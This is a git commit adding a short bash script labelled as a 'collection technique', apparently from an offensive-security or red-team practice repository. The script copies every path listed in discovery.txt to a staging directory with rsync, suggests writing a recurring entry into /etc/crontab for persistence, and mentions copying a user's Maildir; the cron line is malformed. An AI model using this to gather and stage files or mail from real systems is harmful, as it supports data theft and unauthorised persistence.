fab95c11de5b5ccf3b0ae9f44ec839beeebf2db3
suhail97s <suhail1997.ms@gmail.com>
2022-10-22 20:52:46 +0800

    Collection Technique
    rsync + crontab

---
+++ collectiontarget.sh
@@ -0,0 +1,7 @@
+#!/bin/bash
+
+# for copying files and directories from a list.txt that need connect with anne
+cat discovery.txt | xargs -I % rsync -a % /destination/
+# to be added into crontab that will run every 2 minutes:
+2 * * * * * cat discovery.txt | xargs -I % rsync -a % /destination/ >> /etc/crontab
+# For Mail: cp -r ~/Maildir
